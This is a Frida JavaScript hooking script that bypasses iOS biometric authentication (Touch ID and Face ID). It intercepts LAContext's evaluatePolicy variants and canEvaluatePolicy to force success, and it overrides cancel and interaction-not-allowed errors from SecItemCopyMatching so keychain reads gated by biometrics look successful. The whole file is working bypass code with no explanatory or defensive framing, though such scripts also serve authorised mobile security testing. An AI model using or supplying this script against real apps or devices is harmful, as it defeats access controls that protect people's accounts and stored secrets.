// faceid_bypass.js — Bypass LocalAuthentication for both Touch ID and Face ID
// Hooks LAContext evaluatePolicy at ObjC level + Swift bridge

if (ObjC.available) {

  // ── 1. LAContext evaluatePolicy:localizedReason:reply: ──────────────────────
  // Covers both biometryTypeTouchID and biometryTypeFaceID
  const LAContext = ObjC.classes.LAContext;

  if (LAContext) {
    const evalPolicy = LAContext['- evaluatePolicy:localizedReason:reply:'];
    Interceptor.attach(evalPolicy.implementation, {
      onEnter(args) {
        console.log('[LA] evaluatePolicy called — policy: ' + args[2]);
        // args[4] is the reply block (^(BOOL success, NSError *error) {})
        const replyBlock = new ObjC.Block(args[4]);
        const originalImpl = replyBlock.implementation;
        replyBlock.implementation = function(success, error) {
          console.log('[LA] Overriding reply -> success=YES');
          originalImpl.call(this, 1, NULL);
        };
      }
    });
    console.log('[+] Hooked LAContext evaluatePolicy:localizedReason:reply:');
  } else {
    console.log('[-] LAContext not found in ObjC runtime');
  }

  // ── 2. evaluatePolicy:localizedReason:error: (sync variant) ─────────────────
  try {
    const evalSync = LAContext['- evaluatePolicy:localizedReason:error:'];
    if (evalSync) {
      Interceptor.attach(evalSync.implementation, {
        onLeave(retval) {
          console.log('[LA] evaluatePolicy sync -> forcing YES');
          retval.replace(ptr(1));
        }
      });
      console.log('[+] Hooked LAContext evaluatePolicy:localizedReason:error:');
    }
  } catch(e) {}

  // ── 3. canEvaluatePolicy — make it always return YES ────────────────────────
  try {
    const canEval = LAContext['- canEvaluatePolicy:error:'];
    if (canEval) {
      Interceptor.attach(canEval.implementation, {
        onLeave(retval) {
          retval.replace(ptr(1));
        }
      });
      console.log('[+] Hooked LAContext canEvaluatePolicy:error:');
    }
  } catch(e) {}

  // ── 4. SecItemCopyMatching — some apps gate biometric via keychain ACL ───────
  const SecItemCopyMatching = Module.findExportByName('Security', 'SecItemCopyMatching');
  if (SecItemCopyMatching) {
    Interceptor.attach(SecItemCopyMatching, {
      onLeave(retval) {
        if (retval.toInt32() === -25293 /* errSecUserCanceled */
         || retval.toInt32() === -25308 /* errSecInteractionNotAllowed */
         || retval.toInt32() === -128   /* userCancelled */) {
          console.log('[Keychain] Overriding SecItemCopyMatching error -> 0 (success)');
          retval.replace(ptr(0));
        }
      }
    });
    console.log('[+] Hooked SecItemCopyMatching');
  }

  // ── 5. Watch for biometryType to confirm Face ID vs Touch ID ─────────────────
  try {
    const biometryType = LAContext['- biometryType'];
    if (biometryType) {
      Interceptor.attach(biometryType.implementation, {
        onLeave(retval) {
          const type = retval.toInt32();
          const name = type === 1 ? 'TouchID' : type === 2 ? 'FaceID' : 'None/Unknown (' + type + ')';
          console.log('[LA] biometryType = ' + name);
        }
      });
    }
  } catch(e) {}

  console.log('[*] All hooks installed. Trigger biometric prompt on device.');

} else {
  console.log('[-] ObjC runtime not available');
}
